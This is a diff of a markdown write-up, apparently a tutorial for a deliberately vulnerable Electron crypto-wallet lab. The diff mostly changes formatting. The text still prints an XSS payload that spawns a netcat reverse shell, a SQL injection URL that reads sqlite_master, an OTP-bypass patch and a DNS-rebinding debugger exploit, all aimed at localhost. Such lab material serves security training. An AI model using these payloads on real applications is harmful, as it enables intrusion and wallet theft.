@@ -4,9 +4,12 @@
 
 For this application to work the first step would be to have Docker and Docker-Compose correctly installed in a Kali Linux environment. This article is not going to focus on that.
 
-`git clone https://gitlab.com/badbounty/dvcw`
-`cd dvcw/`
-`make install`
+
+``` bash
+git clone https://gitlab.com/badbounty/dvcw
+cd dvcw/
+make install
+```
 
 This commands will start every docker container, a web server that will be listening in port 3000 and a [local ethereum network](https://github.com/trufflesuite/ganache-cli) listening on port 8545.
 
@@ -14,12 +17,12 @@ Once that every docker is up we can start the Client. Download the latest releas
 
 Once we have the file downloaded, we should decompress it with the command:
 
-`tar -xvfz filename -C destination`.
+`tar -xvfz filename -C destination`
 
 Now, we will configure Proxychains to redirect the application traffic to our Burp Suite Proxy.
 
 We simply open the Proxychains configuration file with `nano /etc/proxychains.conf`  and then we add our proxy configuration. In my case, the file will look as the following:
-```
+``` bash
 [ProxyList]
 http 127.0.0.1 8080
 https 127.0.0.1 8080
@@ -29,23 +32,27 @@ Now we can simply open the client with the following command `proxychains /blog/
 
 ## Decompilation
 
-It could be easily done with `npm install asar` , `asar extract app.asar destfolder` , but it could also  be decompiled in a Windows environment with this [plugin](http://www.tc4shell.com/en/7zip/asar/) for 7zip.
+It could be easily done with `npm install asar && asar extract app.asar destfolder` , but it could also  be decompiled in a Windows environment with this [plugin](http://www.tc4shell.com/en/7zip/asar/) for 7zip.
 
 
 
 ### Weak hashing algorithm
 
 The first view we are prompted with is a registration form, and after setting up a password, we can see that a request is sent to the backend, with a 32-char hash.
-
+{:refdef: style="text-align: center;"}
 ![](/blog/images/registerpassword.png)
+{: refdef}
 
 MD5 is an encryption algorithm  which is known for returning a 32-char long hash and for being a insecure type of encryption. If we use this algorithm to encrypt the password that we used to register (you can try it [here](https://www.freecodeformat.com/md5.php)), we can observe that MD5 is being used between the client and the server.
 
 ### No session management
 
-Going to the ´Settings´ menu and changing the profile information generates a request to the backend with no kind of session management, neither the usage of cookies nor an authorization header. This means that we have an open API that does not validate who we are, this means "IDORs" everywhere. 
+Going to the *Settings* menu and changing the profile information generates a request to the backend with no kind of session management, neither the usage of cookies nor an authorization header. This means that we have an open API that does not validate who we are, this means "IDORs" everywhere. 
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/nosessionmanagement.png)
+{: refdef}
+
 
 
 ### Electron version
@@ -53,9 +60,10 @@ Observing the decompiled code we can observe that an outdated version of the Ele
 
 `binwalk app.asar` will give you a detailed list of every package integrated in the compiled version of the application, including the Electron version in use.
 
-
-
+{:refdef: style="text-align: center;"}
 ![](/blog/images/electronversion.png)
+{: refdef}
+
 
 [CVE-2017-12581](https://www.cvedetails.com/vulnerability-list/vendor_id-16801/product_id-39184/version_id-220270/Electron-Electron-1.6.7.html) , [CVE-2018-1000006](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000006).
 
@@ -73,7 +81,10 @@ If the user clicks on the 'Yes' option, the application and a CMD window will be
 
 It is important to note that this behaviour will not be exploitable nor in Chrome nor Firefox browser because both will URL encode the string saved in the window.location variable.
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/cve3.png)
+{: refdef}
+
 
 ### Path traversal
 
@@ -111,7 +122,10 @@ So, now that we are being able to execute code and OS commands on the server, we
 
 Once that we have a reverse shell, we can execute every os command that we want on the server:
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/rce9.png)
+{: refdef}
+
 
 Notes: 
 
@@ -123,7 +137,9 @@ Notes:
 
 When doing some general tests, it was possible to identify a CORS misconfiguration that would allow any malicious party to read the response of the API.
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/cors.png)
+{: refdef}
 
 
 ### Insecure Storage
@@ -131,7 +147,10 @@ When doing some general tests, it was possible to identify a CORS misconfigurati
 #### mnemonic in base64
 The first request the application makes, is a POST to the 'wallets/new' path. As a response to this request, we can see the information of the new wallet, with "parameters" such as 'walletId', 'mnemonic' , 'publicAddress', etc as seen below:
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/istorage1.png)
+{: refdef}
+
 
 Looking closely we can suspect that the 'mnemonic' value is a base64 Encoded value (The '=' character at the end highly encourages us to decode it):
 
@@ -155,11 +174,17 @@ After playing around with the application, I got tired of using the OTP so it´s
 We will try to search where in the client it is the validation being done. We enter the /app/ folder and search for a related string: `grep -rin "otp"`.
 After digging the code for a while, I have come to the conclusion that the /app/utils.js is the file that is doing the validation:
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/otpBypass.png)
+{: refdef}
+
 
 We will change the function so that no matter what happens, it will return true.
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/otpBypass2.png)
+{: refdef}
+
 
 Now we can use the code we want to, and we will be able to make transactions as if we are using the validation.
 
@@ -187,11 +212,18 @@ So, now that we have triggered some JS, let´s try to pop a shell.
 
 Note: In order to test this case, it is important that we prompt the Electron application without proxying the content with Burp as the shells will attempt to use the same connection settings that the main application, and Burp will drop down every connection which is not HTTP.
 
-First, we set up our listener with `nc -lbp 80` in the same box we are running the application. Then, we will use the following payload in the message of a new transaction `<img src=x onerror="var Process = process.binding('process_wrap').Process;var proc = new Process();proc.onexit = function(a,b) {};var env = process.env;var env_ = [];for (var key in env) env_.push(key+'='+env[key]);proc.spawn({file:'/bin/sh',args:['sh','-c','nc -ne /bin/bash 127.0.0.1 80'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});">`. This will make the client set up a reverse shell that connects to our nc server listening in localhost.
+First, we set up our listener with `nc -lbp 80` in the same box we are running the application. Then, we will use the following payload in the message of a new transaction 
+``` html
+<img src=x onerror="var Process = process.binding('process_wrap').Process;var proc = new Process();proc.onexit = function(a,b) {};var env = process.env;var env_ = [];for (var key in env) env_.push(key+'='+env[key]);proc.spawn({file:'/bin/sh',args:['sh','-c','nc -ne /bin/bash 127.0.0.1 80'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});">
+```
+This will make the client set up a reverse shell that connects to our nc server listening in localhost.
 
 ![](/blog/images/clientrce1.png)
 
+{:refdef: style="text-align: center;"}
 ![](/blog/images/clientrce.png)
+{: refdef}
+
 
 ## Wallet takeover
 
@@ -214,7 +246,7 @@ So, to exploit this vulnerability we are going to need two things:
 * A server with an html that triggers some JS code.
 * A DNS server which will iterate from the IP of where we are hosting the web server above and localhost.
 
-For the second one, we will be using the [whonow]()[https://github.com/brannondorsey/whonow] tool and its network.rebind domain, while for the first one we are going to use a python server with a simple HTML file in a VPS:
+For the second one, we will be using the [whonow](https://github.com/brannondorsey/whonow) tool and its network.rebind domain, while for the first one we are going to use a python server with a simple HTML file in a VPS:
 
 `python -m SimpleHTTPServer 9334`
 
@@ -283,7 +315,7 @@ This Javascript file does the following:
 3 - The exploit() funtion creates the WS request that will act as the payload and execute the commands in the machine.
 4 - We initialize the exploit sending the webSocketDebuggerUrl of the debuger, which will prompt a calc.
 
-Now we go to `http://a.<your VPS IP>.1time.127.0.0.1.4time.rebind.network:9334/dnsrebinding.html'` , wait for a minute until the JS is executed and finally our calc is up.
+Now we go to ```http://a.<your VPS IP>.1time.127.0.0.1.4time.rebind.network:9334/dnsrebinding.html'``` , wait for a minute until the JS is executed and finally our calc is up.
 
 
 
@@ -292,8 +324,9 @@ Now we go to `http://a.<your VPS IP>.1time.127.0.0.1.4time.rebind.network:9334/d
 
 By doing SAST over the server code, it is always interesting to take a look to the code that handles the SQL queries. In this case, we can find it in the /express-api/data/index.js file. Every query seems to be using sanitized input except for the getWalletID() function that passes the "walletId" directly from the URL.
 
-
+{:refdef: style="text-align: center;"}
 ![](/blog/images/sqlcode1.png)
+{: refdef}
 
 
 We track down the vulnerable function by doing `grep -rin --exclude-dir=node-modules --exclude-dir=test getWalletById`:
@@ -307,13 +340,13 @@ And now we make another search to determine in which api call this function is t
 
 ![](/blog/images/changewalletprofile2.png)
 
-Now that we know that this method is being invoked when hitting the '/wallets/:walletId/change-profile' endpoint, we should perform some tests to validate if the 'walletId' URL query is vulnerable to SQL injection, so we head to the 'settings' menu on the client and press on the 'Update profile' button. After intercepting the request and modifying the walletId to a simple SQL injection payload we hit with a DB error:
+Now that we know that this method is being invoked when hitting the '/wallets/:walletId/change-profile' endpoint, we should perform some tests to validate if the 'walletId' URL query is vulnerable to SQL injection, so we head to the *Settings* menu on the client and press on the 'Update profile' button. After intercepting the request and modifying the walletId to a simple SQL injection payload we hit with a DB error:
 
 ![](/blog/images/sqlinjection.png)
 
 And after playing for a while we came up with the following payload:
 
-`http://127.0.0.1:3000/wallets/'UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%20(SELECT&20sql&20from sqlite_master%20LIMIT%201)--`
+```http://127.0.0.1:3000/wallets/'UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%20(SELECT&20sql&20from sqlite_master%20LIMIT%201)--```
 
 This query will let you see the creation of the firts table (LIMIT 1) and which columns does it have. We can also change the LIMIT to 1,2 to see the second one, and so on.
 
